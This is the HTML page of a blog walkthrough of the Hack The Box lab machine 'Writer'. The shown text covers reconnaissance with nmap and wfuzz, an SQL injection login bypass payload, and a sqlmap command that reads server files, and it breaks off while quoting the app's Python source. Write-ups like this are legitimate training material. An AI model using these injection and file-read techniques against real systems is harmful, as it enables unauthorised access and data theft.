<!doctype html>














<!-- `site.alt_lang` can specify a language different from the UI -->
<html lang="en" data-mode="dark">
  <!-- The Head -->

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7">
  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <meta
    name="viewport"
    content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover"
  >

  

  
    

    
      
      

      
        <!-- it's a local file path -->

      
    
  

  
    <!-- Begin Jekyll SEO tag v2.8.0 -->
<meta name="generator" content="Jekyll v4.3.2" />
<meta property="og:title" content="HTB Writer Walkthrough" />
<meta name="author" content="tomcat" />
<meta property="og:locale" content="en" />
<meta name="description" content="Perpetual student, continual incremental improvement." />
<meta property="og:description" content="Perpetual student, continual incremental improvement." />
<link rel="canonical" href="/posts/HTB-Writer/" />
<meta property="og:url" content="/posts/HTB-Writer/" />
<meta property="og:site_name" content="imjdl blog" />
<meta property="og:image" content="/assets/img/HTB-Writer/logo.png" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2021-08-13T12:13:00+08:00" />
<meta name="twitter:card" content="summary_large_image" />
<meta property="twitter:image" content="/assets/img/HTB-Writer/logo.png" />
<meta property="twitter:title" content="HTB Writer Walkthrough" />
<meta name="twitter:site" content="@Mortyjin" />
<meta name="twitter:creator" content="@MortyJin" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"tomcat","url":"https://twitter.com/MortyJin"},"dateModified":"2021-08-13T12:13:00+08:00","datePublished":"2021-08-13T12:13:00+08:00","description":"Perpetual student, continual incremental improvement.","headline":"HTB Writer Walkthrough","image":"/assets/img/HTB-Writer/logo.png","mainEntityOfPage":{"@type":"WebPage","@id":"/posts/HTB-Writer/"},"url":"/posts/HTB-Writer/"}</script>
<!-- End Jekyll SEO tag -->

  

  <title>HTB Writer Walkthrough | imjdl blog
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">
<link rel="manifest" href="/assets/img/favicons/site.webmanifest">
<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico">
<meta name="apple-mobile-web-app-title" content="imjdl blog">
<meta name="application-name" content="imjdl blog">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">


  
    
      <link rel="preconnect" href="https://fonts.googleapis.com" >
      <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
    
      <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
      <link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin>
    
      <link rel="preconnect" href="https://fonts.googleapis.com" >
      <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
    
      <link rel="preconnect" href="https://cdn.jsdelivr.net" >
      <link rel="dns-prefetch" href="https://cdn.jsdelivr.net" >
    

    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap">
  

  <!-- GA -->
  

  <!-- Bootstrap -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css">

  <!-- Font Awesome -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.4.2/css/all.min.css">

  <link rel="stylesheet" href="/assets/css/jekyll-theme-chirpy.css">

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.21.3/dist/tocbot.min.css">
  

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css">
  

  
    <!-- Manific Popup -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css">
  

  <!-- JavaScript -->

  

  <!-- A placeholder to allow defining custom metadata -->

</head>


  <body>
    <!-- The Side Bar -->

<aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end">
  <header class="profile-wrapper">
    <a href="/" id="avatar" class="rounded-circle">
      
        
        <img src="/assets/img/favicons/log.png" width="112" height="112" alt="avatar" onerror="this.style.display='none'">
      
    </a>

    <h1 class="site-title">
      <a href="/">imjdl blog</a>
    </h1>
    <p class="site-subtitle fst-italic mb-0">Perpetual student, continual incremental improvement.</p>
  </header>
  <!-- .profile-wrapper -->

  <nav class="flex-column flex-grow-1 w-100 ps-0">
    <ul class="nav">
      <!-- home -->
      <li class="nav-item">
        <a href="/" class="nav-link">
          <i class="fa-fw fas fa-home"></i>
          <span>HOME</span>
        </a>
      </li>
      <!-- the real tabs -->
      
        <li class="nav-item">
          <a href="/categories/" class="nav-link">
            <i class="fa-fw fas fa-stream"></i>
            

            <span>CATEGORIES</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/tags/" class="nav-link">
            <i class="fa-fw fas fa-tags"></i>
            

            <span>TAGS</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/archives/" class="nav-link">
            <i class="fa-fw fas fa-archive"></i>
            

            <span>ARCHIVES</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/about/" class="nav-link">
            <i class="fa-fw fas fa-info-circle"></i>
            

            <span>ABOUT</span>
          </a>
        </li>
        <!-- .nav-item -->
      
    </ul>
  </nav>

  <div class="sidebar-bottom d-flex flex-wrap  align-items-center w-100">
    

    
      

      
        <a
          href="https://github.com/imjdl"
          aria-label="github"
          

          
            target="_blank"
            
          

          

          
            rel="noopener noreferrer"
          
        >
          <i class="fab fa-github"></i>
        </a>
      
    
      

      
        <a
          href="https://twitter.com/Mortyjin"
          aria-label="twitter"
          

          
            target="_blank"
            
          

          

          
            rel="noopener noreferrer"
          
        >
          <i class="fa-brands fa-x-twitter"></i>
        </a>
      
    
      

      
        <a
          href="javascript:location.href = 'mailto:' + ['imelloit','gmail.com'].join('@')"
          aria-label="email"
          

          

          

          
        >
          <i class="fas fa-envelope"></i>
        </a>
      
    
      

      
        <a
          href="/feed.xml"
          aria-label="rss"
          

          

          

          
        >
          <i class="fas fa-rss"></i>
        </a>
      
    
  </div>
  <!-- .sidebar-bottom -->
</aside>
<!-- #sidebar -->


    <div id="main-wrapper" class="d-flex justify-content-center">
      <div class="container d-flex flex-column px-xxl-5">
        <!-- The Top Bar -->

<header id="topbar-wrapper" aria-label="Top Bar">
  <div
    id="topbar"
    class="d-flex align-items-center justify-content-between px-lg-3 h-100"
  >
    <nav id="breadcrumb" aria-label="Breadcrumb">
      

      
        
          
            <span>
              <a href="/">
                Home
              </a>
            </span>

          
        
          
        
          
            
              <span>HTB Writer Walkthrough</span>
            

          
        
      
    </nav>
    <!-- endof #breadcrumb -->

    <button type="button" id="sidebar-trigger" class="btn btn-link">
      <i class="fas fa-bars fa-fw"></i>
    </button>

    <div id="topbar-title">
      Post
    </div>

    <button type="button" id="search-trigger" class="btn btn-link">
      <i class="fas fa-search fa-fw"></i>
    </button>

    <search class="align-items-center ms-3 ms-lg-0">
      <i class="fas fa-search fa-fw"></i>
      <input
        class="form-control"
        id="search-input"
        type="search"
        aria-label="search"
        autocomplete="off"
        placeholder="Search..."
      >
    </search>
    <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">Cancel</button>
  </div>
</header>


        <div class="row flex-grow-1">
          <main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              <!-- Refactor the HTML structure -->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->



<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->



<!-- Change the icon of checkbox -->



<!-- Handle images -->




  
  

  <!-- CDN URL -->
  

  <!-- Add image path -->
  

  
    
      
      
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  

  


<!-- Add header for code snippets -->



<!-- Create heading anchors -->





  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    

    
  

  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    

    
  

  
  

  

  
  

  




<!-- return -->




<article class="px-1">
  <header>
    <h1 data-toc-skip>HTB Writer Walkthrough</h1>

    <div class="post-meta text-muted">
      <!-- published date -->
      <span>
        Posted
        <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1628827980"
  data-df="ll"
  
    data-bs-toggle="tooltip" data-bs-placement="bottom"
  
>
  Aug 13, 2021
</time>

      </span>

      <!-- lastmod date -->
      

      
        
        
        

        

        <div class="mt-3 mb-3">
          <a href="/assets/img/HTB-Writer/logo.png" class="popup img-link preview-img shimmer"><img src="/assets/img/HTB-Writer/logo.png"  alt="Preview Image" width="1200" height="630"  loading="lazy"></a></div>
      

      <div class="d-flex justify-content-between">
        <!-- author(s) -->
        <span>
          

          By

          <em>
            
              
                <a href="https://twitter.com/MortyJin">tomcat</a>
                
              
            
          </em>
        </span>

        <!-- read time -->
        <!-- Calculate the post's reading time, and display the word count in tooltip -->



<!-- words per minute -->










<!-- return element -->
<span
  class="readtime"
  data-bs-toggle="tooltip"
  data-bs-placement="bottom"
  title="2860 words"
>
  <em>15 min</em> read</span>

      </div>
      <!-- .d-flex -->
    </div>
    <!-- .post-meta -->
  </header>

  <div class="content">
    <p><a href="/assets/img/HTB-Writer/banner.png" class="popup img-link  shimmer"><img src="/assets/img/HTB-Writer/banner.png" alt="" loading="lazy"></a></p>

<h2 id="information"><span class="me-2">Information</span><a href="#information" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<ul>
  <li>name: Writer</li>
  <li>OS: Linux</li>
  <li>Difficulty: <code class="language-plaintext highlighter-rouge">Medium</code></li>
  <li>Points: 30</li>
  <li>Release: 2ND AUGUST, 2021</li>
  <li>IP: 10.10.11.101</li>
</ul>

<p>https://app.hackthebox.eu/machines/Writer</p>

<h2 id="summary"><span class="me-2">Summary</span><a href="#summary" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<ul>
  <li>Enumerate to find the admin page.</li>
  <li>Reading files and logging into the system via SQL injection.</li>
  <li>Read source code to find command injection vulnerability and get web shell.</li>
  <li>Read web path to discover configuration files. Read Mysql account secret login to get hash.</li>
  <li>Use hashcat to crack the hash to get the password and get the user.txt.</li>
  <li>Mapping port 25 out, execute a command via /etc/postfix/disclaimer to further elevate privileges and read john’s id_rsa.</li>
  <li>Raise privileges via apt-get.</li>
</ul>

<h2 id="details"><span class="me-2">Details</span><a href="#details" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<h3 id="recon"><span class="me-2">Recon</span><a href="#recon" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<div class="language-shell highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
</pre></td><td class="rouge-code"><pre><span class="c"># Nmap 7.80 scan initiated Sat Aug 7 14:38:25 2021 as: nmap -sS -sV -sC -oN nmap 10.10.11.101</span>
Nmap scan report <span class="k">for </span>writer.htb <span class="o">(</span>10.10.11.101<span class="o">)</span>
Host is up <span class="o">(</span>0.33s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 996 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
80/tcp  open  http        Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
|_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: Story Bank | Writer.HTB
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: 57s
|_nbstat: NetBIOS name: WRITER, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; <span class="o">(</span>unknown<span class="o">)</span>
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   <span class="nb">date</span>: 2021-08-07T06:39:40
|_  start_date: N/A

<span class="c"># Nmap 7.80 scan initiated Sat Aug 7 14:41:42 2021 as: nmap -sU -sV -sC -p 137 -oN nmap\_udp 10.10.11.101</span>
Nmap scan report <span class="k">for </span>writer.htb <span class="o">(</span>10.10.11.101<span class="o">)</span>
Host is up <span class="o">(</span>0.39s latency<span class="o">)</span><span class="nb">.</span>

PORT    STATE SERVICE    VERSION
137/udp open  netbios-ns Samba nmbd netbios-ns <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
Service Info: Host: WRITER

Host script results:
|_nbstat: NetBIOS name: WRITER, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; <span class="o">(</span>unknown<span class="o">)</span>

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
<span class="c"># Nmap done at Sat Aug 7 14:41:44 2021 -- 1 IP address (1 host up) scanned in 2.16 seconds</span>

</pre></td></tr></tbody></table></code></div></div>

<div class="language-shell highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>/etc/hosts
10.10.11.101    writer.htb

</pre></td></tr></tbody></table></code></div></div>
<p><a href="/assets/img/HTB-Writer/001.png" class="popup img-link  shimmer"><img src="/assets/img/HTB-Writer/001.png" alt="" loading="lazy"></a></p>

<p>` wfuzz -w /usr/share/dirb/wordlists/big.txt -u http://writer.htb/FUZZ –hc 404 -t 200`</p>

<p><a href="/assets/img/HTB-Writer/002.png" class="popup img-link  shimmer"><img src="/assets/img/HTB-Writer/002.png" alt="" loading="lazy"></a></p>

<p><a href="/assets/img/HTB-Writer/003.png" class="popup img-link  shimmer"><img src="/assets/img/HTB-Writer/003.png" alt="" loading="lazy"></a></p>

<h3 id="got-web-shell"><span class="me-2">Got Web Shell</span><a href="#got-web-shell" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p><code class="language-plaintext highlighter-rouge">admin ' or '1'='1</code>
<a href="/assets/img/HTB-Writer/004.png" class="popup img-link  shimmer"><img src="/assets/img/HTB-Writer/004.png" alt="" loading="lazy"></a></p>

<p><a href="/assets/img/HTB-Writer/005.png" class="popup img-link  shimmer"><img src="/assets/img/HTB-Writer/005.png" alt="" loading="lazy"></a></p>

<div class="language-shell highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre></td><td class="rouge-code"><pre>POST /administrative HTTP/1.1
Host: writer.htb
User-Agent: Mozilla/5.0 <span class="o">(</span>X11<span class="p">;</span> Ubuntu<span class="p">;</span> Linux x86<span class="se">\_</span>64<span class="p">;</span> rv:91.0<span class="o">)</span> Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.9,image/webp,<span class="se">\*</span>/<span class="se">\*</span><span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.8
Accept-Language: zh-CN,zh<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.8,zh-TW<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.7,zh-HK<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.5,en-US<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.3,en<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.2
Accept-Encoding: <span class="nb">gzip</span>, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 18
Origin: http://writer.htb
Connection: close
Referer: http://writer.htb/administrative
Upgrade-Insecure-Requests: 1

<span class="nb">uname</span><span class="o">=</span>demo&amp;password<span class="o">=</span>demo

</pre></td></tr></tbody></table></code></div></div>
<p><a href="/assets/img/HTB-Writer/006.png" class="popup img-link  shimmer"><img src="/assets/img/HTB-Writer/006.png" alt="" loading="lazy"></a></p>

<p><a href="/assets/img/HTB-Writer/007.png" class="popup img-link  shimmer"><img src="/assets/img/HTB-Writer/007.png" alt="" loading="lazy"></a></p>

<p><code class="language-plaintext highlighter-rouge">/etc/apache2/sites-enabled/000-default.conf</code></p>

<p><code class="language-plaintext highlighter-rouge">sqlmap -r res.txt --file-read=/etc/apache2/sites-enabled/000-default.conf</code></p>
<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
</pre></td><td class="rouge-code"><pre># Virtual host configuration for writer.htb domain
&lt;VirtualHost *:80&gt;
ServerName writer.htb
ServerAdmin [[email protected]](/cdn-cgi/l/email-protection)
WSGIScriptAlias / /var/www/writer.htb/writer.wsgi
&lt;Directory /var/www/writer.htb&gt;
Order allow,deny
Allow from all
&lt;/Directory&gt;
Alias /static /var/www/writer.htb/writer/static
&lt;Directory /var/www/writer.htb/writer/static/&gt;
Order allow,deny
Allow from all
&lt;/Directory&gt;
ErrorLog ${APACHE_LOG_DIR}/error.log
LogLevel warn
CustomLog ${APACHE_LOG_DIR}/access.log combined
&lt;/VirtualHost&gt;

# Virtual host configuration for dev.writer.htb subdomain
# Will enable configuration after completing backend development
# Listen 8080
#&lt;VirtualHost 127.0.0.1:8080&gt;
#       ServerName dev.writer.htb
#       ServerAdmin [[email protected]](/cdn-cgi/l/email-protection)
#
        # Collect static for the writer2_project/writer_web/templates
#       Alias /static /var/www/writer2_project/static
#       &lt;Directory /var/www/writer2_project/static&gt;
#               Require all granted
#       &lt;/Directory&gt;
#
#       &lt;Directory /var/www/writer2_project/writerv2&gt;
#               &lt;Files wsgi.py&gt;
#                       Require all granted
#               &lt;/Files&gt;
#       &lt;/Directory&gt;
#
#       WSGIDaemonProcess writer2_project python-path=/var/www/writer2_project python-home=/var/www/writer2_project/writer2env
#       WSGIProcessGroup writer2_project
#       WSGIScriptAlias / /var/www/writer2_project/writerv2/wsgi.py
#        ErrorLog ${APACHE_LOG_DIR}/error.log
#        LogLevel warn
#        CustomLog ${APACHE_LOG_DIR}/access.log combined
#
#&lt;/VirtualHost&gt;


</pre></td></tr></tbody></table></code></div></div>
<p><code class="language-plaintext highlighter-rouge">/var/www/writer.htb/writer/__init__.py</code></p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
162
163
164
165
166
167
168
169
170
171
172
173
174
175
176
177
178
179
180
181
182
183
184
185
186
187
188
189
190
191
192
193
194
195
196
197
198
199
200
201
202
203
204
205
206
207
208
209
210
211
212
213
214
215
216
217
218
219
220
221
222
223
224
225
226
227
228
229
230
231
232
233
234
235
236
237
238
239
240
241
242
243
244
245
246
247
248
249
250
251
252
253
254
255
256
257
258
259
260
261
262
263
264
265
266
267
268
269
270
271
272
273
274
275
276
277
278
279
280
281
282
283
284
285
286
287
288
289
290
291
292
293
294
295
296
</pre></td><td class="rouge-code"><pre><span class="kn">from</span> <span class="n">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">session</span><span class="p">,</span> <span class="n">redirect</span><span class="p">,</span> <span class="n">url_for</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">render_template</span>
<span class="kn">from</span> <span class="n">mysql.connector</span> <span class="kn">import</span> <span class="n">errorcode</span>
<span class="kn">import</span> <span class="n">mysql.connector</span>
<span class="kn">import</span> <span class="n">urllib.request</span>
<span class="kn">import</span> <span class="n">os</span>
<span class="kn">import</span> <span class="n">PIL</span>
<span class="kn">from</span> <span class="n">PIL</span> <span class="kn">import</span> <span class="n">Image</span><span class="p">,</span> <span class="n">UnidentifiedImageError</span>
<span class="kn">import</span> <span class="n">hashlib</span>

<span class="n">app</span> <span class="o">=</span> <span class="nc">Flask</span><span class="p">(</span><span class="n">__name__</span><span class="p">,</span><span class="n">static_url_path</span><span class="o">=</span><span class="sh">''</span><span class="p">,</span><span class="n">static_folder</span><span class="o">=</span><span class="sh">'</span><span class="s">static</span><span class="sh">'</span><span class="p">,</span><span class="n">template_folder</span><span class="o">=</span><span class="sh">'</span><span class="s">templates</span><span class="sh">'</span><span class="p">)</span>

<span class="c1">#Define connection for database
</span><span class="k">def</span> <span class="nf">connections</span><span class="p">():</span>
